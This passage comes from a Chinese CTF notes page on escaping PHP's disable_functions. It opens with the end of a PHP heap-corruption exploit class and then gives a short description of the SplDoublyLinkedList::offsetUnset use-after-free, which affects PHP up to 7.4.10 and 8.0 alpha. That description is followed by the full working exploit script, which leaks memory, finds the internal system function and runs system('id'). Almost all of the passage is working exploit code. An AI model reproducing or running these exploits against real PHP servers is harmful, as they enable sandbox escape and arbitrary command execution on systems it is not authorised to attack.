            fwrite($this->uafp, "\x00");
        }
    }

    private function prepare_leaker() {
        $str_off = $this->helper_off + CHUNK_SIZE + 8;
        $this->write($str_off, 2);
        $this->write($str_off + 0x10, 6);

        $val_off = $this->helper_off + 0x48;
        $this->write($val_off, $this->helper_addr + CHUNK_SIZE + 8);
        $this->write($val_off + 8, 0xA);
    }

    private function prepare_cleanup($binary_leak) {
        $ret_gadget = $binary_leak;
        do {
            --$ret_gadget;
        } while($this->read($ret_gadget, 1) !== 0xC3);
        $this->log("ret gadget = 0x%x", $ret_gadget);
        $this->write(0, $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));
        $this->write(8, $ret_gadget);
    }

    private function read($addr, $n = 8) {
        $this->write($this->helper_off + CHUNK_SIZE + 16, $addr - 0x10);
        $value = strlen($this->helper->c);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function write($p, $v, $n = 8) {
        for($i = 0; $i < $n; $i++) {
            $this->abc[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    private function get_basic_funcs($addr) {
        while(true) {
            // In rare instances the standard module might lie after the addr we're starting
            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
            // In that case, changing the direction of the search should fix the crash.
            // $addr += 0x10;
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    $this->log("standard module @ 0x%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function cleanup() {
        $this->hfp = fopen('php://memory', 'w');
        fwrite($this->hfp, pack('QQ', 0, $this->abc_addr));
        for($i = 0; $i < FILTER_SIZE - 0x10; $i++) {
            fwrite($this->hfp, "\x00");
        }
    }

    private function str2ptr($p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($this->abc[$p + $j]);
        }
        return $address;
    }

    private function ptr2str($ptr, $n = 8) {
        $out = '';
        for ($i = 0; $i < $n; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    private function log($format, $val = '') {
        if(LOGGING) {
            printf("{$format}\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat('A', $size));
    }
}
?>
```


## 利用 SplDoublyLinkedList UAF {#利用-spldoublylinkedlist-uaf}

> <https://www.freebuf.com/articles/web/251017.html>

PHP 的 SplDoublyLinkedList 双向链表库中存在一个 UAF 漏洞，该漏洞将允许攻击者通过运行
PHP 代码来转义 disable_functions 限制函数。在该漏洞的帮助下，远程攻击者将能够实现
PHP 沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过 PHP
的某些限制，例如 disable_functions 和 safe_mode 等等

-   PHP v7.4.10 及其之前版本
-   PHP v8.0（Alpha）

例题：BMZCTF2020 - ezphp

exp：
<https://github.com/cfreal/exploits/blob/master/php-SplDoublyLinkedList-offsetUnset/exploit.php>

```php
<?php
#
# PHP SplDoublyLinkedList::offsetUnset UAF
# Charles Fol (@cfreal_)
# 2020-08-07
# PHP is vulnerable from 5.3 to 8.0 alpha
# This exploit only targets PHP7+.
#
# SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.
# Said iteration is done by keeping a pointer to the "current" DLL element.
# You can then call next() or prev() to make the DLL point to another element.
# When you delete an element of the DLL, PHP will remove the element from the
# DLL, then destroy the zval, and finally clear the current ptr if it points
# to the element. Therefore, when the zval is destroyed, current is still
# pointing to the associated element, even if it was removed from the list.
# This allows for an easy UAF, because you can call $dll->next() or
# $dll->prev() in the zval's destructor.
#
#
error_reporting(E_ALL);
define('NB_DANGLING', 200);
define('SIZE_ELEM_STR', 40 - 24 - 1);
define('STR_MARKER', 0xcf5ea1);
function i2s(&$s, $p, $i, $x=8)
{
    for($j=0;$j<$x;$j++)
    {
        $s[$p+$j] = chr($i & 0xff);
        $i >>= 8;
    }
}
function s2i(&$s, $p, $x=8)
{
    $i = 0;
    for($j=$x-1;$j>=0;$j--)
    {
        $i <<= 8;
        $i |= ord($s[$p+$j]);
    }
    return $i;
}
class UAFTrigger
{
    function __destruct()
    {
        global $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;
        #"print('UAF __destruct: ' . "\n");
        $dlls[NB_DANGLING]->offsetUnset(0);
        # At this point every $dll->current points to the same freed chunk. We allocate
        # that chunk with a string, and fill the zval part
        $fake_dll_element = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
        i2s($fake_dll_element, 0x00, 0x12345678); # ptr
        i2s($fake_dll_element, 0x08, 0x00000004, 7); # type + other stuff
        # Each of these dlls current->next pointers point to the same location,
        # the string we allocated. When calling next(), our fake element becomes
        # the current value, and as such its rc is incremented. Since rc is at
        # the same place as zend_string.len, the length of the string gets bigger,
        # allowing to R/W any part of the following memory
        for($i = 0; $i <= NB_DANGLING; $i++)
            $dlls[$i]->next();
        if(strlen($fake_dll_element) <= SIZE_ELEM_STR)
            die('Exploit failed: fake_dll_element did not increase in size');
        $leaked_str_offsets = [];
        $leaked_str_zval = [];
        # In the memory after our fake element, that we can now read and write,
        # there are lots of zend_string chunks that we allocated. We keep three,
        # and we keep track of their offsets.
        for($offset = SIZE_ELEM_STR + 1; $offset <= strlen($fake_dll_element) - 40; $offset += 40)
        {
            # If we find a string marker, pull it from the string list
            if(s2i($fake_dll_element, $offset + 0x18) == STR_MARKER)
            {
                $leaked_str_offsets[] = $offset;
                $leaked_str_zval[] = $strs[s2i($fake_dll_element, $offset + 0x20)];
                if(count($leaked_str_zval) == 3)
                    break;
            }
        }
        if(count($leaked_str_zval) != 3)
            die('Exploit failed: unable to leak three zend_strings');
        # free the strings, except the three we need
        $strs = null;
        # Leak adress of first chunk
        unset($leaked_str_zval[0]);
        unset($leaked_str_zval[1]);
        unset($leaked_str_zval[2]);
        $first_chunk_addr = s2i($fake_dll_element, $leaked_str_offsets[1]);
        # At this point we have 3 freed chunks of size 40, which we can read/write,
        # and we know their address.
        print('Address of first RW chunk: 0x' . dechex($first_chunk_addr) . "\n");
        # In the third one, we will allocate a DLL element which points to a zend_array
        $rw_dll->push([3]);
        $array_addr = s2i($fake_dll_element, $leaked_str_offsets[2] + 0x18);
        # Change the zval type from zend_object to zend_string
        i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
        if(gettype($rw_dll[0]) != 'string')
            die('Exploit failed: Unable to change zend_array to zend_string');
        # We can now read anything: if we want to read 0x11223300, we make zend_string*
        # point to 0x11223300-0x10, and read its size using strlen()
        # Read zend_array->pDestructor
        $zval_ptr_dtor_addr = read($array_addr + 0x30);
        print('Leaked zval_ptr_dtor address: 0x' . dechex($zval_ptr_dtor_addr) . "\n");
        # Use it to find zif_system
        $system_addr = get_system_address($zval_ptr_dtor_addr);
        print('Got PHP_FUNCTION(system): 0x' . dechex($system_addr) . "\n");
        # In the second freed block, we create a closure and copy the zend_closure struct
        # to a string
        $rw_dll->push(function ($x) {});
        $closure_addr = s2i($fake_dll_element, $leaked_str_offsets[1] + 0x18);
        $data = str_shuffle(str_repeat('A', 0x200));
        for($i = 0; $i < 0x138; $i += 8)
        {
            i2s($data, $i, read($closure_addr + $i));
        }
        # Change internal func type and pointer to make the closure execute system instead
        i2s($data, 0x38, 1, 4);
        i2s($data, 0x68, $system_addr);
        # Push our string, which contains a fake zend_closure, in the last freed chunk that
        # we control, and make the second zval point to it.
        $rw_dll->push($data);
        $fake_zend_closure = s2i($fake_dll_element, $leaked_str_offsets[0] + 0x18) + 24;
        i2s($fake_dll_element, $leaked_str_offsets[1] + 0x18, $fake_zend_closure);
        print('Replaced zend_closure by the fake one: 0x' . dechex($fake_zend_closure) . "\n");
        # Calling it now
        print('Running system("id");' . "\n");
        $rw_dll[1]('id');
        print_r('DONE'."\n");
    }
}
class DanglingTrigger
{
    function __construct($i)
    {
        $this->i = $i;
    }
    function __destruct()
    {
        global $dlls;
        #D print('__destruct: ' . $this->i . "\n");
        $dlls[$this->i]->offsetUnset(0);
        $dlls[$this->i+1]->push(123);
        $dlls[$this->i+1]->offsetUnset(0);
    }
}
class SystemExecutor extends ArrayObject
{
    function offsetGet($x)
    {
        parent::offsetGet($x);
    }
}
/**
 * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
 * and setting its type to zend_string, so that zend_string->len points to the value
 * we want to read.
 */
function read($addr, $s=8)
{
    global $fake_dll_element, $leaked_str_offsets, $rw_dll;
    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x18, $addr - 0x10);
    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
    $value = strlen($rw_dll[0]);
    if($s != 8)
        $value &= (1 << ($s << 3)) - 1;
    return $value;
}
function get_binary_base($binary_leak)
{
    $base = 0;
    $start = $binary_leak & 0xfffffffffffff000;
    for($i = 0; $i < 0x1000; $i++)
    {
        $addr = $start - 0x1000 * $i;
        $leak = read($addr, 7);
        # ELF header
        if($leak == 0x10102464c457f)
            return $addr;
    }
    # We'll crash before this but it's clearer this way
    die('Exploit failed: Unable to find ELF header');
}
function parse_elf($base)
{
    $e_type = read($base + 0x10, 2);
    $e_phoff = read($base + 0x20);
    $e_phentsize = read($base + 0x36, 2);
    $e_phnum = read($base + 0x38, 2);
    for($i = 0; $i < $e_phnum; $i++) {
        $header = $base + $e_phoff + $i * $e_phentsize;
        $p_type  = read($header + 0x00, 4);
        $p_flags = read($header + 0x04, 4);
        $p_vaddr = read($header + 0x10);
        $p_memsz = read($header + 0x28);
        if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
            # handle pie
            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
            $data_size = $p_memsz;
        } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
            $text_size = $p_memsz;
        }
    }
    if(!$data_addr || !$text_size || !$data_size)
        die('Exploit failed: Unable to parse ELF');
    return [$data_addr, $text_size, $data_size];
}
function get_basic_funcs($base, $elf) {
    list($data_addr, $text_size, $data_size) = $elf;
    for($i = 0; $i < $data_size / 8; $i++) {
        $leak = read($data_addr + $i * 8);
        if($leak - $base > 0 && $leak < $data_addr) {
            $deref = read($leak);
            # 'constant' constant check
            if($deref != 0x746e6174736e6f63)
                continue;
        } else continue;
        $leak = read($data_addr + ($i + 4) * 8);
        if($leak - $base > 0 && $leak < $data_addr) {
            $deref = read($leak);
            # 'bin2hex' constant check
            if($deref != 0x786568326e6962)
                continue;
        } else continue;
        return $data_addr + $i * 8;
    }
}
function get_system($basic_funcs)
{
    $addr = $basic_funcs;
    do {
        $f_entry = read($addr);
        $f_name = read($f_entry, 6);
        if($f_name == 0x6d6574737973) { # system
            return read($addr + 8);
        }
        $addr += 0x20;
    } while($f_entry != 0);
    return false;
}
function get_system_address($binary_leak)
{
    $base = get_binary_base($binary_leak);
    print('ELF base: 0x' .dechex($base) . "\n");
    $elf = parse_elf($base);
    $basic_funcs = get_basic_funcs($base, $elf);
    print('Basic functions: 0x' .dechex($basic_funcs) . "\n");
    $zif_system = get_system($basic_funcs);
    return $zif_system;
}
$dlls = [];
$strs = [];
$rw_dll = new SplDoublyLinkedList();
# Create a chain of dangling triggers, which will all in turn
# free current->next, push an element to the next list, and free current
# This will make sure that every current->next points the same memory block,
# which we will UAF.
for($i = 0; $i < NB_DANGLING; $i++)
{
    $dlls[$i] = new SplDoublyLinkedList();
    $dlls[$i]->push(new DanglingTrigger($i));
    $dlls[$i]->rewind();
}
# We want our UAF'd list element to be before two strings, so that we can
# obtain the address of the first string, and increase is size. We then have
# R/W over all memory after the obtained address.
define('NB_STRS', 50);
for($i = 0; $i < NB_STRS; $i++)
{
    $strs[] = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
    i2s($strs[$i], 0, STR_MARKER);
    i2s($strs[$i], 8, $i, 7);
}
# Free one string in the middle, ...
$strs[NB_STRS - 20] = 123;
# ... and put the to-be-UAF'd list element instead.
$dlls[0]->push(0);
# Setup the last DLlist, which will exploit the UAF
$dlls[NB_DANGLING] = new SplDoublyLinkedList();
$dlls[NB_DANGLING]->push(new UAFTrigger());
$dlls[NB_DANGLING]->rewind();
# Trigger the bug on the first list
$dlls[0]->offsetUnset(0);
```
